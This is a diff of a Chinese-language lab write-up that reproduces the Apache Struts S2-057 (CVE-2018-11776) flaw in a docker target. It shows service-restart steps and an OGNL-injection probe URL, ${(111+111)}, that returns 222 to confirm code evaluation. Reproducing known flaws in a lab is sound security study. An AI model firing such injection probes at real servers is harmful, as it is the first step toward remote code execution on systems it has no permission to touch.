@@ -70,7 +70,7 @@ https://lgtm.com/blog/apache_struts_CVE-2018-11776
 ```
 ![](./struts-actionchaining.jpg)
 
-然后去bin，kill掉进程,因为修改了配置文件，所以需要重启服务
+然后去bin目录，kill掉进程,因为修改了配置文件，所以需要重启服务
 ```
 root@88fd8d560155:/usr/local/tomcat/bin# cd /usr/local/tomcat/bin/
 root@88fd8d560155:/usr/local/tomcat/bin# ls
@@ -89,8 +89,11 @@ Starting s2-048_struts2_1 ... done
 ```
 # 0x05  验证st2-057
 docker 靶机：http://www.canyouseeme.cc:8080/struts2-showcase/
+
 命令执行：http://www.canyouseeme.cc:8080/struts2-showcase/${(111+111)}/actionChain1.action
+
 ${(111+111)}
+
 得到执行结果返回在url中：http://www.canyouseeme.cc:8080/struts2-showcase/222/register2.action
 
 ![](./st2-57.jpg)
